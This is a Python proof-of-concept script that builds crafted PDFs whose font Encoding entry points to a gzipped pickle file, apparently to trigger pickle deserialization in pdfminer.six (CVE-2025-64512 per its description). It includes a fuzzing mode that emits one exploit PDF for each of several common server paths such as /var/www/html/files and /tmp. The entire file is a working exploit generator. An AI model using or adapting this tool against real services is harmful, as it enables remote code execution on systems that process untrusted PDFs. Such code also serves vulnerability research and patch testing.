#!/usr/bin/env python3
import sys
import argparse

FUZZ_PATHS = [
    "/var/www/html/files",
    "/var/www/files",
    "/var/www/pdf/files",
    "/opt/app/files",
    "/app/files",
    "/var/www/html/files",
    "/var/www/html/data",
    "/tmp",
    "/var/tmp",
]

def make_pdf(path_value, outfile):
    encoded = "/" + path_value.replace("/", "#2F")
    stream = b"BT /F0 12 Tf 100 700 Td (x) Tj ET"

    pdf = f"""%PDF-1.4
1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj
2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj
3 0 obj<</Type/Page/MediaBox[0 0 612 792]/Parent 2 0 R/Resources<</Font<</F0 4 0 R>>>>>>/Contents 6 0 R>>endobj
4 0 obj<</Type/Font/Subtype/Type0/BaseFont/Test/Encoding{encoded}/DescendantFonts[5 0 R]>>endobj
5 0 obj<</Type/Font/Subtype/CIDFontType2/BaseFont/Test/CIDSystemInfo<</Registry(Adobe)/Ordering(Identity)/Supplement 0>>>>endobj
6 0 obj<</Length {len(stream)}>>stream
{stream.decode()}
endstream
endobj
xref
0 7
0000000000 65535 f
0000000009 00000 n
0000000058 00000 n
0000000115 00000 n
0000000232 00000 n
trailer<</Size 7/Root 1 0 R>>
startxref
0
%%EOF
"""
    with open(outfile, 'wb') as f:
        f.write(pdf.encode())
    return path_value

def main():
    parser = argparse.ArgumentParser(description="Create PDF that triggers pdfminer.six pickle deserialization (CVE-2025-64512)")
    parser.add_argument("pickle_name", nargs="?", default="evil",
                        help="Pickle filename without .pickle.gz (default: evil)")
    parser.add_argument("-o", "--output", default="exploit.pdf",
                        help="Output PDF filename (default: exploit.pdf)")
    parser.add_argument("-p", "--path",
                        help="Custom absolute path to pickle (without .pickle.gz)")
    parser.add_argument("-f", "--fuzz", action="store_true",
                        help="Generate PDFs for all common absolute paths")

    args = parser.parse_args()

    if args.path:
        path = args.path.rstrip("/")
        if not path.endswith(args.pickle_name):
            path = f"{path}/{args.pickle_name}"
        resolved = make_pdf(path, args.output)
        print(f"[+] {args.output} -> {resolved}.pickle.gz")

    elif args.fuzz:
        print(f"[+] Fuzzing mode: generating PDFs for {len(FUZZ_PATHS)} paths")
        for i, base in enumerate(FUZZ_PATHS):
            path = f"{base}/{args.pickle_name}"
            outfile = f"exploit_f{i}.pdf"
            resolved = make_pdf(path, outfile)
            print(f"    {outfile} -> {resolved}.pickle.gz")

    else:
        path = f"./{args.pickle_name}"
        resolved = make_pdf(path, args.output)
        print(f"[+] {args.output} -> {resolved}.pickle.gz (relative)")

if __name__ == "__main__":
    main()
